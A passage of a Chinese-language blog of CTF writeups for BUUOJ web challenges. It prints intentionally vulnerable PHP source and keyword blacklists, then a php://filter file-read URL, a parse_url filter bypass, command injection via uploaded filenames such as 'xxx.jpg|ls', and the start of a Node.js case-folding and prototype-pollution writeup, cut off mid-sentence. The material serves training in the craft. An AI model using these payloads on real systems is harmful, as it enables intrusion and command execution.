<span class=\"keyword\">if</span> (stristr($v, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter_directory_guest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $keywords = [<span class=\"string\">&quot;flag&quot;</span>,<span class=\"string\">&quot;manage&quot;</span>,<span class=\"string\">&quot;ffffllllaaaaggg&quot;</span>,<span class=\"string\">&quot;info&quot;</span>];</span><br><span class=\"line\">    $uri = parse_url($_SERVER[<span class=\"string\">&quot;REQUEST_URI&quot;</span>]);</span><br><span class=\"line\">    parse_str($uri[<span class=\"string\">&#x27;query&#x27;</span>], $query);</span><br><span class=\"line\"><span class=\"comment\">//    var_dump($query);</span></span><br><span class=\"line\"><span class=\"comment\">//    die();</span></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($keywords <span class=\"keyword\">as</span> $token)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($query <span class=\"keyword\">as</span> $k =&gt; $v)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stristr($k, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stristr($v, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Filter</span>(<span class=\"params\">$string</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $mysqli;</span><br><span class=\"line\">    $blacklist = <span class=\"string\">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class=\"line\">    $whitelist = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos(<span class=\"string\">&quot;$whitelist&quot;</span>, $string[$i]) === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">            Hacker();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&quot;/$blacklist/is&quot;</span>, $string)) &#123;</span><br><span class=\"line\">        Hacker();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_string($string)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sql_query</span>(<span class=\"params\">$sql_query</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $mysqli;</span><br><span class=\"line\">    $res = $mysqli-&gt;query($sql_query);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span>(<span class=\"params\">$user, $pass</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $user = Filter($user);</span><br><span class=\"line\">    $pass = md5($pass);</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $sql;</span><br><span class=\"line\">    $res = sql_query($sql);</span><br><span class=\"line\"><span class=\"comment\">//    var_dump($res);</span></span><br><span class=\"line\"><span class=\"comment\">//    die();</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res-&gt;num_rows) &#123;</span><br><span class=\"line\">        $data = $res-&gt;fetch_array();</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">&#x27;user&#x27;</span>] = $data[username_which_you_do_not_know];</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">&#x27;login&#x27;</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">&#x27;isadmin&#x27;</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">updateadmin</span>(<span class=\"params\">$level,$user</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $sql;</span><br><span class=\"line\">    $res = sql_query($sql);</span><br><span class=\"line\"><span class=\"comment\">//    var_dump($res);</span></span><br><span class=\"line\"><span class=\"comment\">//    die();</span></span><br><span class=\"line\"><span class=\"comment\">//    die($res);</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($res == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span>(<span class=\"params\">$user, $pass</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $mysqli;</span><br><span class=\"line\">    $user = Filter($user);</span><br><span class=\"line\">    $pass = md5($pass);</span><br><span class=\"line\">    $sql = <span class=\"string\">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class=\"line\">    $res = sql_query($sql);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $mysqli-&gt;insert_id;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">logout</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    session_destroy();</span><br><span class=\"line\">    Header(<span class=\"string\">&quot;Location: index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><figcaption><span>user.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">&quot;function.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>( !<span class=\"keyword\">isset</span>( $_SESSION[<span class=\"string\">&#x27;user&#x27;</span>] ))&#123;</span><br><span class=\"line\">    Header(<span class=\"string\">&quot;Location: index.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">&#x27;isadmin&#x27;</span>] === <span class=\"string\">&#x27;1&#x27;</span>)&#123;</span><br><span class=\"line\">    $oper_you_can_do = $OPERATE_admin;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $oper_you_can_do = $OPERATE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">&#x27;isadmin&#x27;</span>] === <span class=\"string\">&#x27;1&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;page&#x27;</span>]) || $_GET[<span class=\"string\">&#x27;page&#x27;</span>] === <span class=\"string\">&#x27;&#x27;</span>)&#123;</span><br><span class=\"line\">        $page = <span class=\"string\">&#x27;info&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $page = $_GET[<span class=\"string\">&#x27;page&#x27;</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;page&#x27;</span>])|| $_GET[<span class=\"string\">&#x27;page&#x27;</span>] === <span class=\"string\">&#x27;&#x27;</span>)&#123;</span><br><span class=\"line\">        $page = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $page = $_GET[<span class=\"string\">&#x27;page&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($page === <span class=\"string\">&#x27;info&#x27;</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\"><span class=\"comment\">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class=\"line\">            Header(<span class=\"string\">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">filter_directory();</span><br><span class=\"line\"><span class=\"comment\">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//    $page = &#x27;info&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;$page.php&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><figcaption><span>config.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(E_ERROR | E_WARNING | E_PARSE);</span><br><span class=\"line\">define(BASEDIR, <span class=\"string\">&quot;/var/www/html/&quot;</span>);</span><br><span class=\"line\">define(FLAG_SIG, <span class=\"number\">1</span>);</span><br><span class=\"line\">$OPERATE = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;userinfo&#x27;</span>,<span class=\"string\">&#x27;upload&#x27;</span>,<span class=\"string\">&#x27;search&#x27;</span>);</span><br><span class=\"line\">$OPERATE_admin = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;userinfo&#x27;</span>,<span class=\"string\">&#x27;upload&#x27;</span>,<span class=\"string\">&#x27;search&#x27;</span>,<span class=\"string\">&#x27;manage&#x27;</span>);</span><br><span class=\"line\">$DBHOST = <span class=\"string\">&quot;localhost&quot;</span>;</span><br><span class=\"line\">$DBUSER = <span class=\"string\">&quot;root&quot;</span>;</span><br><span class=\"line\">$DBPASS = <span class=\"string\">&quot;Nu1LCTF2018!@#qwe&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//$DBPASS = &quot;&quot;;</span></span><br><span class=\"line\">$DBNAME = <span class=\"string\">&quot;N1CTF&quot;</span>;</span><br><span class=\"line\">$mysqli = @<span class=\"keyword\">new</span> mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(mysqli_connect_errno())&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no sql connection&quot;</span>.mysqli_connect_error();</span><br><span class=\"line\">        $mysqli=<span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><figcaption><span>register.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;function.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">&#x27;action&#x27;</span>] === <span class=\"string\">&#x27;register&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;username&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;password&#x27;</span>]))&#123;</span><br><span class=\"line\">        $user = $_POST[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">        $pass = $_POST[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">        $res = register($user,$pass);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($res)&#123;</span><br><span class=\"line\">            Header(<span class=\"string\">&quot;Location: index.php&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            $errmsg = <span class=\"string\">&quot;Username has been registered!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        Header(<span class=\"string\">&quot;Location: error_parameter.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$_SESSION[<span class=\"string\">&#x27;login&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">&quot;templates/register.html&quot;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    Header(<span class=\"string\">&quot;Location : user.php?page=info&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><figcaption><span>info.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (FLAG_SIG != <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;you can not visit it directly &quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;templates/info.html&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>info.php里会include templates/info.html，打开后有个提示ffffllllaaaaggg.php，很明显的直接读源码是行不通的。看一下过滤函数 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter_directory_guest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $keywords = [<span class=\"string\">&quot;flag&quot;</span>,<span class=\"string\">&quot;manage&quot;</span>,<span class=\"string\">&quot;ffffllllaaaaggg&quot;</span>,<span class=\"string\">&quot;info&quot;</span>];</span><br><span class=\"line\">    $uri = parse_url($_SERVER[<span class=\"string\">&quot;REQUEST_URI&quot;</span>]);</span><br><span class=\"line\">    parse_str($uri[<span class=\"string\">&#x27;query&#x27;</span>], $query);</span><br><span class=\"line\"><span class=\"comment\">//    var_dump($query);</span></span><br><span class=\"line\"><span class=\"comment\">//    die();</span></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($keywords <span class=\"keyword\">as</span> $token)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($query <span class=\"keyword\">as</span> $k =&gt; $v)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stristr($k, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stristr($v, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> parse_url函数解析URL，直接绕过。具体请参考<a href=\"https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/\">这里</a>，http://d95fe231-c608-4167-98d0-6205f111a1ae.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg。得到了ffffllllaaaaggg.php的内容 <figure class=\"highlight php\"><figcaption><span>ffffllllaaaaggg.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (FLAG_SIG != <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;you can not visit it directly&quot;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can find sth in m4aaannngggeee&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 再读m4aaannngggeee文件。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (FLAG_SIG != <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;you can not visit it directly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;templates/upload.html&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<p>访问templates/upload.html后发现处理上传的文件是upllloadddd.php，接着读 <figure class=\"highlight php\"><figcaption><span>upllloadddd.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$allowtype = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;gif&quot;</span>,<span class=\"string\">&quot;png&quot;</span>,<span class=\"string\">&quot;jpg&quot;</span>);</span><br><span class=\"line\">$size = <span class=\"number\">10000000</span>;</span><br><span class=\"line\">$path = <span class=\"string\">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class=\"line\">$filename = $_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(is_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!move_uploaded_file($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error:can not move&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error:not an upload file&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$newfile = $path.$filename;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $filename;</span><br><span class=\"line\">$picdata = system(<span class=\"string\">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class=\"string\">&quot; | base64 -w 0&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class=\"string\">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;error&#x27;</span>]&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    unlink($newfile);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Upload file error: &quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ext = array_pop(explode(<span class=\"string\">&quot;.&quot;</span>,$_FILES[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]));</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class=\"line\">    unlink($newfile);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure> 没有任何限制直接上传，同时醒目的system提示我们要命令注入。构造xxx.jpg|ls文件上传列目录。</p>\r\n<img src=\"/2020/04/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Eating-CMS/ls.png\" class=\"\">\r\n<p>然后就找flag了。注意一个问题，我们的输入会写入文件名，Linux下例如/这样的字符不能用在文件名上，所以不能直接xxx.jpg|ls /这样列根目录，迂回一下，用echo yyy| `base64 -d`这样执行命令。</p>\r\n<img src=\"/2020/04/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Eating-CMS/get_flag.png\" class=\"\">\r\n\n    <div id=\"aplayer-yzKywaYu\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"39227626\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d0c7071f-f2b8-41e1-907f-ba8b00bd0a1b}</p>\r\n","categories":["Writeups"],"tags":["Web"]},{"title":"BUUOJ刷题-Web-Ez_express","url":"/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2020 i春秋新春公益赛的Ez_express，NodeJS的题。</p>\r\n<p>开题提示我们用ADMIN登录，随便注册一下页面注释提示www.zip。看一下app.js，Express框架的程序，index页面指向routes/index.js。</p>\r\n<p>login路由有点东西： <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">router.post(<span class=\"string\">&#x27;/login&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.body.Submit == <span class=\"string\">&quot;register&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (safeKeyword(req.body.userid)) &#123;</span><br><span class=\"line\">            res.end(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        req.session.user = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;user&#x27;</span>: req.body.userid.toUpperCase(),</span><br><span class=\"line\">            <span class=\"string\">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class=\"line\">            <span class=\"string\">&#x27;isLogin&#x27;</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.redirect(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (req.body.Submit == <span class=\"string\">&quot;login&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!req.session.user) &#123;</span><br><span class=\"line\">            res.end(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;</span><br><span class=\"line\">            req.session.user.isLogin = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            res.end(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res.redirect(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    ;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure> safeKeyword()使得我们注册的时候不能用\"admin\"，而题目又要求我们用admin用户名登录。注意到在register()里用户名特别的加了一步toUppercase()操作，这是干什么用的？</p>\r\n<p>参考<a href=\"https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\">这里</a>，Javascript在处理某些语系特定字符的时候会有些意外，我们可以用<code>ı</code>来代替<code>i</code>，除了上文提到的几个，<a href=\"https://stackoverflow.com/questions/1850232/turkish-case-conversion-in-javascript\">这里</a>还有补充。</p>\r\n<p>因此我们注册一个<code>admın</code>用户即可绕过限制了。然后就让我们提交你最喜欢的语言？？？ <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">router.post(<span class=\"string\">&#x27;/action&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.session.user.user != <span class=\"string\">&quot;ADMIN&quot;</span>) &#123;</span><br><span class=\"line\">        res.end(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    req.session.user.data = clone(req.body);</span><br><span class=\"line\">    res.end(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\r\n<p>我们POST过去的东西被clone()到了req.body对象里。 <figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> isObject = <span class=\"function\"><span class=\"params\">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class=\"built_in\">Object</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> merge = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> attr <span class=\"keyword\">in</span> b) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class=\"line\">            merge(a[attr], b[attr]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            a[attr] = b[attr];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> clone = <span class=\"function\">(<span class=\"params\">a</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> merge(&#123;&#125;, a);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure> 这就涉及到新的知识点了，原型链污染。具体参考<a 